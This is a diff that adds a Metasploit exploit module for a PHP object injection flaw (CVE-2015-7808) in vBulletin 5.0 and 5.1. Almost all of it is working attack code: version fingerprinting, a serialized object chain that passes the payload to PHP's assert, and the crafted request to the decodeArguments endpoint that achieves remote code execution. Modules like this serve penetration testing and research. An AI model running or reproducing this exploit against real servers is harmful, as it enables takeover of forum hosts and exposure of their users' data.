@@ -1,0 +1,104 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'vBulletin 5.1.2 Unserialize Code Execution',
+      'Description'    => %q{
+        This module exploits a PHP object injection vulnerability in vBulletin 5.1.2 to 5.1.9
+      },
+      'Platform'       => 'php',
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+          'Netanel Rubin',  # reported by
+          'cutz',  # original exploit
+          'Julien (jvoisin) Voisin',  # metasploit module
+      ],
+      'Payload'        =>
+        {
+          'BadChars'    => "\x22",
+        },
+      'References'     =>
+        [
+          ['CVE', '2015-7808'],
+          ['EDB', '38629'],
+          ['URL', 'http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq'],
+          ['URL', 'http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/']
+        ],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [
+          [ 'Automatic Targeting', { 'auto' => true }  ],
+          ['vBulletin 5.0.X', {'chain' => 'vB_Database'}],
+          ['vBulletin 5.1.X', {'chain' => 'vB_Database_MySQLi'}],
+      ],
+      'DisclosureDate' => 'Nov 4 2015',
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
+        ])
+  end
+
+  def check
+      begin
+          res = send_request_cgi({ 'uri' => target_uri.path })
+          if (res && res.body.include?('vBulletin Solutions, Inc.'))
+              if res.body.include?("Version 5.0")
+                  @my_target = targets[1] if target['auto']
+                  return Exploit::CheckCode::Appears
+              elsif res.body.include?("Version 5.1")
+                  @my_target = targets[2] if target['auto']
+                  return Exploit::CheckCode::Appears
+              else
+                  return Exploit::CheckCode::Detected
+              end
+          end
+      rescue ::Rex::ConnectionError
+          return Exploit::CheckCode::Safe
+      end
+  end
+
+  def exploit
+    print_status("Trying to inferprint the instance...")
+
+    @my_target = target
+    check_code = check
+
+    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
+      fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable instance")
+    end
+
+    if @my_target.nil? || @my_target['auto']
+      fail_with(Failure::NoTarget, "#{peer} - Failed to auto detect, try setting a manual target...")
+    end
+
+    print_status("Exploiting #{@my_target.name}...")
+
+    chain = 'O:12:"vB_dB_Result":2:{s:5:"*db";O:'
+    chain << @my_target["chain"].length.to_s
+    chain << ':"'
+    chain << @my_target["chain"]
+    chain << '":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:'
+    chain << "#{payload.encoded.length}:\"#{payload.encoded}\";}"
+
+    chain = Rex::Text.uri_encode(chain)
+    chain = chain.gsub(/%2a/, '%00%2a%00')  # php and Rex disagree on '*' encoding
+
+    send_request_cgi({
+        'method' => 'GET',
+        'uri'       => normalize_uri(target_uri.path, 'ajax/api/hook/decodeArguments'),
+        'vars_get' => {
+            'arguments' => chain
+      },
+       'encode_params' => false,
+    })
+  end
+end
